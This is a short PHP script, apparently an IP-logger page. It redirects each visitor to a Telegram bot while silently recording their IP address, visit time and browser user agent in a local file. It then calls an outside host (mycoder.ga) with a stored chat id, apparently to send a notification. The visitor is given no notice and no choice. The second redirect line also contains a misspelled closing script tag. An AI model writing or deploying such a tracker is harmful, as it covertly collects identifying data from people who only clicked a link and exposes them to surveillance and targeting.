<?php
echo "<script>window.location.href='https://t.me/IPuzrobot'</script>";
date_default_timezone_set("Asia/Tashkent");
$soat = date("H:i:s",strtotime("0 hour"));
$sana = date('d.m.Y',strtotime("0 hour"));
$ip = isset($_SERVER['HTTP_CLIENT_IP']) 
    ? $_SERVER['HTTP_CLIENT_IP'] 
    : (isset($_SERVER['HTTP_X_FORWARDED_FOR']) 
      ? $_SERVER['HTTP_X_FORWARDED_FOR'] 
      : $_SERVER['REMOTE_ADDR']);
if(!file_exists('./data.txt')){
$file = fopen('./data.txt',"w");
}
if(!file_exists($ip)){
$txt = "<b>⏰Vaqti: $sana $soat da kirish!</b>\n<b>🌐 Ip manzil: ".$ip."</b>\n<b>📱: Qurilma : ".$_SERVER['HTTP_USER_AGENT']."</b>\n\n";

file_put_contents('./data.txt',$txt.PHP_EOL , FILE_APPEND | LOCK_EX);
fopen($ip,'w');
$id = file_get_contents('chatid.txt');
file_get_contents('https://mycoder.ga/ip/config/send.php?chatid='.$id);
}
echo "<script>window.location.href='https://t.me/ipuzrobot';</scrip>";
?>